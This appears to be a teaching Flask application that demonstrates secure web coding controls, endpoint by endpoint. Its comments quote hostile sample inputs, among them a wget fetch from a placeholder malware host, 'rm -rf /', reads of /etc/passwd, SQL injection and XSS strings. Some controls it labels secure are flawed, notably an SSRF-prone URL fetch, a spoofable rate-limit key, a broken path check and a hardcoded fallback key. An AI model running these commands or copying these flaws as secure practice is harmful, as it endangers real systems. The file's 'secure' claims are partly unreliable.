# app_good.py
# ============================================================
# SECURE FLASK APPLICATION - EDUCATIONAL DEMONSTRATION
# ============================================================
# This application demonstrates secure coding practices for web development.
# It shows proper implementations of security controls to prevent common
# vulnerabilities like SQL injection, XSS, CSRF, and more.
#
# 🎓 LEARNING OBJECTIVES:
# - Understand secure authentication and authorization mechanisms
# - Learn input validation and output encoding techniques  
# - Implement cryptographic security controls properly
# - Prevent common web application vulnerabilities (OWASP Top 10)
# - Follow defense-in-depth security principles
# - Apply secure coding best practices in real applications
#
# 🔒 SECURITY TOPICS COVERED:
# ✅ Strong Authentication (PBKDF2, rate limiting, timing-safe comparison)
# ✅ Authorization & Access Control (session management, IDOR prevention)
# ✅ Input Validation (integer bounds, allowlists, parameterized queries)
# ✅ Output Encoding (XSS prevention with proper escaping)
# ✅ CSRF Protection (double-submit token pattern)
# ✅ File Security (safe uploads, path traversal prevention)
# ✅ XML Security (XXE prevention with defusedxml)
# ✅ Command Injection Prevention (subprocess security)
# ✅ SQL Injection Prevention (parameterized queries)
# ✅ Deserialization Security (JSON vs pickle)
# ✅ Cryptographic Controls (HMAC signatures, integrity verification)
# ✅ Error Handling (information disclosure prevention)
# ✅ Memory Safety (bounds checking, DoS prevention)
#
# 🚀 SETUP INSTRUCTIONS:
#   pip install flask defusedxml
#   export APP_SECRET_KEY="your-secret-key-here"  # Optional but recommended
#   export SIG_KEY="your-signature-key-here"     # For HMAC verification
#   python app_good.py
# 
# 🌐 ACCESS: http://127.0.0.1:5000/
#
# 📚 FOR STUDENTS:
# Each endpoint demonstrates specific security controls with detailed comments.
# Study the code to understand both the vulnerability being prevented and
# the secure implementation that mitigates the risk. Practice testing each
# endpoint to see how security controls behave under different conditions.
# ============================================================
from flask import Flask, request, jsonify, redirect, g, session, make_response
from pathlib import Path
import os, sqlite3, json, secrets, hmac, hashlib, time, subprocess, logging, urllib.request
from urllib.parse import urlparse
from markupsafe import escape
from defusedxml import ElementTree as DET  # Secure XML parser - prevents XXE attacks
import struct

# ============================================================
# APPLICATION SETUP AND CONFIGURATION
# ============================================================

app = Flask(__name__)

# SECURITY BEST PRACTICE: Never hardcode secrets in source code
# Load secret key from environment variables for production security
# Fall back to cryptographically secure random key for development
app.secret_key = os.environ.get("APP_SECRET_KEY", secrets.token_hex(32))

# ============================================================
# DATABASE SETUP AND USER MANAGEMENT
# ============================================================

# Create a clean database for demonstration
DB = "good.db"
Path(DB).unlink(missing_ok=True)  # Remove existing database
conn = sqlite3.connect(DB)
cur = conn.cursor()

# Create users table with proper security fields
# - pwd_salt: Random salt for each password (prevents rainbow table attacks)
# - pwd_hash: PBKDF2 hash of password with salt (strong key derivation)
# - is_admin: Role-based access control flag
cur.execute("CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT UNIQUE, pwd_salt BLOB, pwd_hash BLOB, is_admin INTEGER)")
conn.commit()

def create_user(username, password, is_admin=False):
    """
    Creates a user with securely hashed password.
    
    SECURITY FEATURES:
    - Unique random salt per password (prevents rainbow table attacks)
    - PBKDF2 with 200,000 iterations (makes brute force expensive)
    - SHA-256 hash function (cryptographically secure)
    - Separate storage of salt and hash
    """
    # Generate cryptographically secure random salt (16 bytes = 128 bits)
    salt = secrets.token_bytes(16)
    
    # Use PBKDF2 (Password-Based Key Derivation Function 2) with:
    # - SHA-256: Secure hash function
    # - 200,000 iterations: High cost to slow down brute force attacks
    # - This makes each password verification take ~100ms, acceptable for users
    #   but expensive for attackers trying millions of passwords
    dk = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 200_000)
    
    conn = sqlite3.connect(DB)
    cur = conn.cursor()
    # Store username, salt, hash, and admin flag
    cur.execute("INSERT INTO users (username,pwd_salt,pwd_hash,is_admin) VALUES (?,?,?,?)",
                (username, salt, dk, 1 if is_admin else 0))
    conn.commit(); conn.close()

# Create demonstration users with secure passwords
# Note: In production, users would register through secure registration process
create_user("alice", "CorrectHorseBatteryStaple", True)   # Admin user
create_user("bob", "Password123!", False)                 # Regular user

# ============================================================
# RATE LIMITING FOR BRUTE FORCE PROTECTION
# ============================================================

# Simple in-memory rate limiting to prevent password brute force attacks
# In production, use Redis or database-backed rate limiting
WINDOW = 30.0      # Time window in seconds
MAX_TRIES = 5      # Maximum attempts per window
LOGIN_TRIES = {}   # Dictionary to track attempts per IP

def throttle(ip):
    """
    Implements sliding window rate limiting to prevent brute force attacks.
    
    SECURITY PURPOSE:
    - Prevents automated password guessing
    - Mitigates credential stuffing attacks
    - Slows down attackers while allowing legitimate users
    
    ALGORITHM:
    - Track timestamps of login attempts per IP
    - Allow only MAX_TRIES attempts within WINDOW seconds
    - Use sliding window (old attempts automatically expire)
    """
    now = time.time()
    
    # Get recent attempts for this IP (within the time window)
    tries = [t for t in LOGIN_TRIES.get(ip, []) if now - t <= WINDOW]
    
    # If too many recent attempts, block this IP
    if len(tries) >= MAX_TRIES:
        LOGIN_TRIES[ip] = tries  # Update with filtered list
        return True  # Throttle this request
    
    # Add current attempt timestamp
    tries.append(now)
    LOGIN_TRIES[ip] = tries
    return False  # Allow this request

# ============================================================
# UTILITY FUNCTIONS FOR API RESPONSES
# ============================================================

def ok(data=None, status=200): 
    """Return successful JSON response with consistent format."""
    return (jsonify({"ok": True, "data": data}), status)

def err(msg="error", status=400): 
    """Return error JSON response with consistent format."""
    return (jsonify({"ok": False, "error": msg}), status)

# ============================================================
# SESSION MANAGEMENT AND USER AUTHENTICATION
# ============================================================

@app.before_request
def load_user():
    """
    Loads current user information into Flask's g object before each request.
    
    SECURITY FEATURES:
    - Server-side session management (user ID stored in session)
    - Database verification of user existence
    - Graceful handling of invalid/expired sessions
    """
    uid = session.get("uid")  # Get user ID from session
    if not uid:
        g.user = None  # No user logged in
        return
    
    # Verify user still exists in database (handles deleted users)
    conn = sqlite3.connect(DB)
    cur = conn.cursor()
    row = cur.execute("SELECT id,username,is_admin FROM users WHERE id=?", (uid,)).fetchone()
    conn.close()
    
    # Set user info in Flask's g object (available for this request)
    g.user = None if not row else {
        "id": row[0], 
        "username": row[1], 
        "is_admin": bool(row[2])
    }

@app.route("/")
def index():
    """
    API documentation endpoint - lists all available security demonstrations.
    
    This endpoint serves as both documentation and a learning guide,
    showing students what security topics are covered in this application.
    """
    return ok({
        "message": "Secure Flask Application - Educational Security Demonstrations",
        "topics": [
            "Authentication (server-side) -> /auth/login (POST)",
            "Authorization / IDOR fix -> /me (GET)", 
            "Encrypt-at-rest / strong KDF -> pbkdf2_hmac",
            "No broken crypto (avoid MD5/unsalted)",
            "Rate limit against password guessing",
            "Integer bounds checks -> /math/sum32?x=...&y=...",
            "Download with integrity check -> /code/fetch?url=...&sha256=...",
            "Open Redirect allowlist -> /redirect?next=/home",
            "XSS defense (escape) -> /xss?msg=...",
            "CSRF token (double submit) -> /csrf-token, /bank/transfer (POST)",
            "Safe upload -> /upload (POST file)",
            "Safe XML parse -> /xml/parse (POST)",
            "Path normalization -> /logs/read?file=app.log",
            "OS command safe -> /sys/ping?host=8.8.8.8",
            "SQLi defense (params) -> /users/find?name=...",
            "No unsafe pickle; use JSON -> /json/load (POST)",
            "Memory/size limits to avoid DoS -> /buf/pack?count=...",
            "No format-string injection -> %s patterns only",
            "No hardcoded passwords; secrets via env",
            "Safe error handling -> custom 500",
            "No eval/exec; safe expression demo -> /code/eval (reject)",
            "Signature verification (HMAC) -> /sig/verify (POST)"
        ]
    })

# ============================================================
# SECURE AUTHENTICATION IMPLEMENTATION
# ============================================================

@app.post("/auth/login")
def login():
    """
    Secure login endpoint with multiple protection layers.
    
    SECURITY PROTECTIONS:
    1. Rate limiting to prevent brute force attacks
    2. Strong password verification with PBKDF2
    3. Timing-safe comparison to prevent timing attacks
    4. Parameterized queries to prevent SQL injection
    5. No information leakage about valid usernames
    """
    # Get client IP for rate limiting (handle proxy headers)
    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "0.0.0.0")
    
    # Apply rate limiting first - block if too many attempts
    if throttle(ip):
        return err("too_many_attempts", 429)

    # Get credentials from form data
    username = request.form.get("username", "")
    password = request.form.get("password", "")

    # Query user with parameterized query (prevents SQL injection)
    conn = sqlite3.connect(DB)
    cur = conn.cursor()
    row = cur.execute("SELECT id,pwd_salt,pwd_hash,is_admin FROM users WHERE username=?", 
                     (username,)).fetchone()
    conn.close()
    
    # If user doesn't exist, return generic error (don't reveal valid usernames)
    if not row:
        return err("invalid", 401)
    
    uid, salt, stored, is_admin = row
    
    # Recompute hash with same parameters used during registration
    dk = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 200_000)
    
    # Use timing-safe comparison to prevent timing attacks
    # hmac.compare_digest() takes constant time regardless of where strings differ
    if not hmac.compare_digest(dk, stored):
        return err("invalid", 401)
    
    # Successful login - create session
    session["uid"] = uid
    return ok({"msg": "logged in", "is_admin": bool(is_admin)})

# ============================================================
# AUTHORIZATION AND ACCESS CONTROL
# ============================================================

@app.get("/me")
def me():
    """
    Returns current user information - demonstrates proper authorization.
    
    SECURITY FEATURES:
    - Requires authentication (checks if user is logged in)
    - Returns only information the user is authorized to see
    - Prevents IDOR (Insecure Direct Object Reference) attacks
    """
    # Check if user is authenticated
    if not g.user: 
        return err("auth_required", 401)
    
    # Return user's own information (no IDOR vulnerability)
    return ok({
        "id": g.user["id"], 
        "username": g.user["username"], 
        "is_admin": g.user["is_admin"]
    })

# ============================================================
# INTEGER OVERFLOW PROTECTION
# ============================================================

@app.get("/math/sum32")
def math_sum32():
    """
    Demonstrates secure integer arithmetic with bounds checking.
    
    VULNERABILITY PREVENTED: Integer Overflow
    - Unchecked integer arithmetic can wrap around and cause unexpected behavior
    - In security contexts, this can lead to buffer overflows or logic bypasses
    
    SECURITY CONTROLS:
    - Input validation (ensure inputs are integers)
    - Range checking (ensure values fit in 32-bit unsigned integers)
    - Overflow detection (check result before returning)
    """
    try:
        x = int(request.args.get("x", "0"))
        y = int(request.args.get("y", "0"))
    except ValueError:
        return err("invalid_int", 400)
    
    # Explicitly bound to 32-bit unsigned integer range (0 to 4,294,967,295)
    if not (0 <= x <= 0xFFFFFFFF and 0 <= y <= 0xFFFFFFFF):
        return err("out_of_range", 400)
    
    res = x + y
    
    # Detect overflow before it occurs (rather than after wrapping)
    if res > 0xFFFFFFFF:
        return err("overflow", 400)
    
    return ok({"sum": res})

# ============================================================
# SECURE FILE DOWNLOAD WITH INTEGRITY VERIFICATION
# ============================================================

@app.get("/code/fetch")
def code_fetch():
    """
    Secure file download with cryptographic integrity verification.
    
    VULNERABILITY PREVENTED: Supply Chain Attacks
    - Downloading code/files without verification can introduce malicious content
    - Man-in-the-middle attacks can modify downloads in transit
    
    SECURITY CONTROLS:
    - Requires expected SHA-256 hash for verification
    - Downloads with timeout to prevent DoS
    - Verifies integrity before processing
    - Does NOT execute downloaded content
    """
    url = request.args.get("url")
    expected = request.args.get("sha256")
    
    if not url or not expected: 
        return err("url_and_sha256_required", 400)
    
    # Download with timeout to prevent hanging requests
    data = urllib.request.urlopen(url, timeout=5).read()
    
    # Compute SHA-256 hash of downloaded content
    digest = hashlib.sha256(data).hexdigest()
    
    # Use timing-safe comparison to prevent timing attacks on hash verification
    if not hmac.compare_digest(digest, expected.lower()):
        return err("hash_mismatch", 400)
    
    # SECURITY NOTE: Do NOT execute downloaded content
    # Only return metadata about the verified download
    return ok({"len": len(data), "sha256": digest})

# ============================================================
# OPEN REDIRECT ATTACK PREVENTION
# ============================================================

# Allowlist of trusted hosts for redirects
ALLOWED_HOSTS = {"127.0.0.1:5000", "localhost:5000"}

def is_safe(url: str) -> bool:
    """
    Validates redirect URLs against allowlist to prevent open redirect attacks.
    
    VULNERABILITY PREVENTED: Open Redirect
    - Attackers can abuse redirect functionality to send users to malicious sites
    - Often used in phishing attacks to make malicious links appear legitimate
    
    SECURITY APPROACH:
    - Allowlist approach (only allow known safe hosts)
    - Relative URLs are considered safe (stay on same domain)
    - Strict protocol validation (only http/https)
    """
    u = urlparse(url)
    
    # Relative URLs (no host specified) are safe - they stay on same domain
    if not u.netloc:
        return True
    
    # For absolute URLs, check protocol and host against allowlist
    return (u.scheme in {"http","https"}) and (u.netloc in ALLOWED_HOSTS)

@app.get("/redirect")
def safe_redirect():
    """
    Safe redirect endpoint with allowlist validation.
    
    SECURITY FEATURES:
    - Validates destination URL against allowlist
    - Falls back to safe default for invalid URLs
    - Prevents open redirect attacks
    """
    nxt = request.args.get("next", "/")
    
    # Validate URL safety before redirecting
    if not is_safe(nxt):
        nxt = "/"  # Fallback to safe default
    
    return redirect(nxt)

# ============================================================
# CROSS-SITE SCRIPTING (XSS) PREVENTION
# ============================================================

@app.get("/xss")
def safe_xss():
    """
    Demonstrates proper XSS prevention through output encoding.
    
    VULNERABILITY PREVENTED: Cross-Site Scripting (XSS)
    - Malicious scripts injected into web pages can steal cookies, session tokens
    - Can be used for account takeover, data theft, or malware distribution
    
    SECURITY CONTROL:
    - Use Flask's escape() function to encode HTML special characters
    - Converts <, >, &, ", ' to HTML entities (&lt;, &gt;, etc.)
    - Safe to include user input in HTML output
    """
    msg = request.args.get("msg", "hello")
    
    # CRITICAL: Always escape user input before including in HTML
    # This converts malicious scripts like <script>alert('xss')</script>
    # into harmless text: &lt;script&gt;alert('xss')&lt;/script&gt;
    return f"<h1>{escape(msg)}</h1>"

# ============================================================
# CSRF (CROSS-SITE REQUEST FORGERY) PROTECTION
# ============================================================

def get_csrf():
    """
    Generates and manages CSRF tokens for request validation.
    
    CSRF TOKEN MECHANISM:
    - Generates unique token per session
    - Token must be included in state-changing requests
    - Server validates token matches session token
    - Prevents malicious sites from making unauthorized requests
    """
    tok = session.get("csrf")
    if not tok:
        # Generate cryptographically secure random token
        tok = secrets.token_urlsafe(32)  # 32 bytes = 256 bits of entropy
        session["csrf"] = tok
    return tok

@app.get("/csrf-token")
def csrf_token():
    """
    Endpoint to retrieve CSRF token for client-side applications.
    
    USAGE:
    1. Client requests token from this endpoint
    2. Client includes token in X-CSRF-Token header for protected requests
    3. Server validates token matches session token
    """
    return ok({"csrf": get_csrf()})

@app.post("/bank/transfer")
def safe_transfer():
    """
    Example of CSRF-protected endpoint using double-submit token pattern.
    
    VULNERABILITY PREVENTED: Cross-Site Request Forgery (CSRF)
    - Malicious websites cannot forge requests to transfer money
    - Requires proof that request originated from legitimate page
    
    SECURITY MECHANISM:
    - Requires CSRF token in X-CSRF-Token header
    - Token must match the one stored in user's session
    - Uses timing-safe comparison to prevent timing attacks
    """
    header = request.headers.get("X-CSRF-Token", "")
    
    # Validate CSRF token using timing-safe comparison
    if not (header and hmac.compare_digest(header, get_csrf())):
        return err("csrf_failed", 400)
    
    # Process the transfer (demo only - not real banking logic)
    to = request.form.get("to", "acctX")
    amt = request.form.get("amount", "0")
    return ok({"transferred": amt, "to": to})

# ============================================================
# SECURE FILE UPLOAD HANDLING
# ============================================================

# Configure secure upload directory and constraints
SAFE_UPLOAD = Path("./uploads_good"); SAFE_UPLOAD.mkdir(exist_ok=True)
ALLOWED_EXT = {".txt", ".png", ".jpg", ".pdf"}  # Allowlist of safe file types
MAX_SIZE = 5 * 1024 * 1024  # 5 MB maximum file size

@app.post("/upload")
def safe_upload():
    """
    Secure file upload with multiple validation layers.
    
    VULNERABILITIES PREVENTED:
    - Malicious file upload (executable files, scripts)
    - Directory traversal attacks (../../etc/passwd)
    - Denial of service through large files
    - File overwrite attacks
    
    SECURITY CONTROLS:
    - File extension allowlist (only safe file types)
    - File size limits to prevent DoS
    - Filename sanitization (remove path components)
    - Random filename generation to prevent conflicts/overwrites
    """
    f = request.files.get("file")
    if not f: 
        return err("no_file", 400)
    
    # Extract just the filename (remove any directory path components)
    # This prevents directory traversal attacks like ../../evil.txt
    name = Path(f.filename).name
    ext = Path(name).suffix.lower()
    
    # Validate file extension against allowlist
    if ext not in ALLOWED_EXT:
        return err("bad_extension", 400)
    
    # Read file content and check size limits
    data = f.read()
    if len(data) > MAX_SIZE:
        return err("too_large", 400)
    
    # Generate cryptographically secure random filename
    # This prevents filename collision attacks and predictable file locations
    rnd = secrets.token_hex(8) + ext
    dest = SAFE_UPLOAD / rnd
    
    # Save file with secure filename
    dest.write_bytes(data)
    return ok({"saved_as": str(dest.name)})

# ============================================================
# SECURE XML PARSING (XXE PREVENTION)
# ============================================================

@app.post("/xml/parse")
def safe_xml():
    """
    Secure XML parsing using defusedxml library.
    
    VULNERABILITY PREVENTED: XML External Entity (XXE) Attacks
    - Standard XML parsers can be exploited to read local files
    - Can be used for SSRF (Server-Side Request Forgery)
    - May lead to denial of service through XML bombs
    
    SECURITY CONTROL:
    - Uses defusedxml library instead of standard xml module
    - Automatically disables dangerous XML features:
      * External entity processing
      * DTD processing  
      * XInclude processing
    - Prevents XML bomb attacks
    """
    xml = request.data or b"<root/>"
    
    # defusedxml.ElementTree mitigates XXE/XML bombs automatically
    # It's a drop-in replacement for xml.etree.ElementTree with security fixes
    try:
        root = DET.fromstring(xml)
        return ok({"tag": root.tag, "text": (root.text or "")})
    except Exception:
        return err("invalid_xml", 400)

# ============================================================
# PATH TRAVERSAL ATTACK PREVENTION  
# ============================================================

# Configure secure log directory
LOG_DIR = Path("./logs_good"); LOG_DIR.mkdir(exist_ok=True)
(LOG_DIR / "app.log").write_text("demo\n", encoding="utf-8")

@app.get("/logs/read")
def safe_logs_read():
    """
    Secure file reading with path traversal prevention.
    
    VULNERABILITY PREVENTED: Path Traversal / Directory Traversal
    - Attackers try to access files outside intended directory
    - Common payloads: ../../../etc/passwd, ..\\windows\\system32\\config\\sam
    - Can lead to exposure of sensitive system files
    
    SECURITY CONTROLS:
    - Path resolution to handle .. and symbolic links
    - Boundary checking to ensure access stays within allowed directory
    - Explicit validation of resolved path
    """
    name = request.args.get("file", "app.log")
    
    # Resolve the full path, including any symbolic links or .. components
    target = (LOG_DIR / name).resolve()
    
    # CRITICAL SECURITY CHECK: Ensure resolved path stays within LOG_DIR
    # This prevents access to files outside the intended directory
    # Example: "../../../etc/passwd" would resolve outside LOG_DIR and be blocked
    if not str(target).startswith(str(LOG_DIR) + os.sep):
        return err("forbidden", 403)
    
    try:
        return ok({"content": target.read_text(encoding="utf-8")})
    except Exception:
        return err("not_found", 404)

# ============================================================
# OS COMMAND INJECTION PREVENTION
# ============================================================

@app.get("/sys/ping")
def safe_ping():
    """
    Secure system command execution with input validation.
    
    VULNERABILITY PREVENTED: OS Command Injection
    - Attackers inject shell metacharacters to execute arbitrary commands
    - Examples: "; rm -rf /", "| cat /etc/passwd", "&& wget malware.com/script.sh"
    - Can lead to complete system compromise
    
    SECURITY CONTROLS:
    - Strict input validation (allowlist approach)
    - Use subprocess.run() with shell=False
    - Pass command and arguments as separate list items
    - Never concatenate user input into shell commands
    """
    host = request.args.get("host", "127.0.0.1")
    
    # STRICT INPUT VALIDATION: Only allow IP addresses (digits and dots)
    # This prevents injection of shell metacharacters like ; | & $ ` ( )
    if not host.replace(".", "").isdigit():
        return err("invalid_host", 400)
    
    # SECURE COMMAND EXECUTION:
    # - shell=False prevents shell interpretation of metacharacters
    # - Arguments passed as list prevents command injection
    # - subprocess.run() is safer than os.system() or os.popen()
    out = subprocess.run(["ping", "-c", "1", host], 
                        capture_output=True, text=True)
    
    # Limit output size to prevent response flooding
    return ok({"rc": out.returncode, "out": out.stdout[:500]})

# ============================================================
# SQL INJECTION PREVENTION
# ============================================================

@app.get("/users/find")
def safe_users_find():
    """
    Secure database query using parameterized statements.
    
    VULNERABILITY PREVENTED: SQL Injection
    - Most critical web application vulnerability
    - Attackers inject SQL code to manipulate database queries
    - Can lead to data theft, data modification, or complete database compromise
    
    EXAMPLES OF SQL INJECTION:
    - Input: ' OR '1'='1' --
    - Results in: SELECT * FROM users WHERE username LIKE '%' OR '1'='1' --%'
    - This would return all users instead of filtering by name
    
    SECURITY CONTROL:
    - Use parameterized queries (? placeholders)
    - Database driver handles proper escaping automatically
    - User input is treated as data, never as SQL code
    - NEVER concatenate user input into SQL strings
    """
    name = request.args.get("name", "")
    
    conn = sqlite3.connect(DB)
    cur = conn.cursor()
    
    # SECURE PARAMETERIZED QUERY:
    # The ? placeholder is safely replaced by the database driver
    # User input in 'name' cannot break out of the string context
    rows = cur.execute("SELECT id,username,is_admin FROM users WHERE username LIKE ?", 
                      (f"%{name}%",)).fetchall()
    conn.close()
    
    return ok({"rows": rows})

# ============================================================
# SECURE DESERIALIZATION
# ============================================================

@app.post("/json/load")
def json_load():
    """
    Safe data deserialization using JSON instead of pickle.
    
    VULNERABILITY PREVENTED: Insecure Deserialization
    - pickle.loads() can execute arbitrary Python code during deserialization
    - Attackers can craft malicious payloads to achieve code execution
    - Often leads to Remote Code Execution (RCE)
    
    SECURITY CONTROL:
    - Use JSON for data exchange instead of pickle
    - JSON is a safe data format that cannot contain executable code
    - Limited to basic data types: strings, numbers, booleans, arrays, objects
    """
    try:
        # JSON parsing is safe - cannot execute arbitrary code
        # Only supports basic data types, no code execution possible
        data = json.loads(request.data or b"{}")
        return ok({"keys": list(data.keys())})
    except Exception:
        return err("bad_json", 400)

# ============================================================
# MEMORY SAFETY AND DOS PREVENTION
# ============================================================

@app.get("/buf/pack")
def safe_buf_pack():
    """
    Secure buffer operations with bounds checking.
    
    VULNERABILITY PREVENTED: Denial of Service (DoS)
    - Large memory allocations can exhaust server resources
    - Unbounded operations can cause server crashes or timeouts
    - Resource exhaustion affects availability for legitimate users
    
    SECURITY CONTROLS:
    - Input validation for numeric parameters
    - Upper bounds checking to prevent excessive memory allocation
    - Reasonable limits based on application requirements
    """
    try:
        count = int(request.args.get("count", "1000"))
    except ValueError:
        return err("invalid_int", 400)
    
    # Enforce reasonable upper bound to prevent DoS
    # 100,000 integers * 4 bytes = 400KB maximum allocation
    if not (0 <= count <= 100000):
        return err("count_too_large", 400)
    
    # Safe memory allocation within bounds
    packed = struct.pack("I" * count, *([1] * count))
    return ok({"len": len(packed)})

# ============================================================
# FORMAT STRING INJECTION PREVENTION
# ============================================================

@app.get("/fmt")
def safe_fmt():
    """
    Safe string formatting to prevent format string attacks.
    
    VULNERABILITY PREVENTED: Format String Injection
    - Using user input directly as format string can lead to crashes or data leaks
    - Attackers can use format specifiers like %x, %s, %n to read/write memory
    - In Python, can potentially lead to information disclosure
    
    SECURITY CONTROL:
    - Never use user input as the format string
    - Use fixed format patterns with user input as data
    - Prefer f-strings or .format() for complex formatting
    """
    user = request.args.get("user", "guest")
    
    # SAFE: User input is data, not format string
    # The format pattern "%s" is fixed and controlled by developer
    return ok({"msg": "Hello, %s" % user})

# ============================================================
# SECURE ERROR HANDLING
# ============================================================

@app.errorhandler(500)
def handle_500(e):
    """
    Secure error handling that prevents information disclosure.
    
    VULNERABILITY PREVENTED: Information Disclosure
    - Detailed error messages can reveal system internals to attackers
    - Stack traces may contain sensitive file paths, database schemas, etc.
    - Error details help attackers understand system architecture
    
    SECURITY CONTROLS:
    - Log detailed errors for developers (server-side only)
    - Return generic error messages to users
    - Consistent error response format
    - No stack traces in production responses
    """
    # Log detailed error information for debugging (server-side only)
    logging.exception("Internal error: %s", e)
    
    # Return generic error to user (no sensitive details)
    return err("internal_error", 500)

# ============================================================
# CODE INJECTION PREVENTION
# ============================================================

@app.get("/code/eval")
def no_eval():
    """
    Demonstrates rejection of code evaluation requests.
    
    VULNERABILITY PREVENTED: Code Injection
    - eval() and exec() functions can execute arbitrary Python code
    - User input passed to these functions leads to Remote Code Execution (RCE)
    - One of the most critical security vulnerabilities
    
    SECURITY CONTROL:
    - Completely disable eval/exec functionality
    - Return error for any code evaluation requests
    - Never execute user-provided code directly
    """
    return err("disabled", 400)

# ============================================================
# CRYPTOGRAPHIC SIGNATURE VERIFICATION
# ============================================================

# Load signing key from environment (never hardcode in source)
SHARED_KEY = os.environ.get("SIG_KEY", "change-me-please").encode()

@app.post("/sig/verify")
def signature_verify():
    """
    Demonstrates HMAC signature verification for message integrity and authenticity.
    
    SECURITY PURPOSE:
    - Verify message integrity (data hasn't been tampered with)
    - Authenticate message source (proves sender has the shared key)
    - Prevent message replay attacks when combined with timestamps/nonces
    
    HMAC (Hash-based Message Authentication Code):
    - Uses shared secret key known to both sender and receiver
    - Cryptographically secure - cannot be forged without the key
    - Provides both integrity and authenticity in one operation
    
    USAGE PATTERN:
    1. Sender computes HMAC of message using shared key
    2. Sender includes HMAC in X-Signature header
    3. Receiver recomputes HMAC and compares with provided signature
    4. If signatures match, message is authentic and unmodified
    """
    body = request.data or b""
    provided = request.headers.get("X-Signature", "")
    
    # Compute HMAC-SHA256 of request body using shared secret
    calc = hmac.new(SHARED_KEY, body, hashlib.sha256).hexdigest()
    
    # Use timing-safe comparison to prevent timing attacks
    # Standard string comparison could leak information about partial matches
    if not hmac.compare_digest(provided, calc):
        return err("bad_signature", 401)
    
    return ok({"verified": True})

# ============================================================
# APPLICATION STARTUP
# ============================================================

if __name__ == "__main__":
    """
    Application entry point with secure configuration.
    
    SECURITY CONFIGURATION:
    - debug=False: Disables debug mode in production
      * Debug mode exposes sensitive information in error pages
      * Allows code execution through web interface
      * Should NEVER be enabled in production
    
    PRODUCTION DEPLOYMENT NOTES:
    - Use environment variables for all secrets
    - Enable HTTPS with valid certificates
    - Configure proper logging and monitoring
    - Use a production WSGI server (not Flask's development server)
    - Implement proper backup and recovery procedures
    """
    app.run(debug=False)
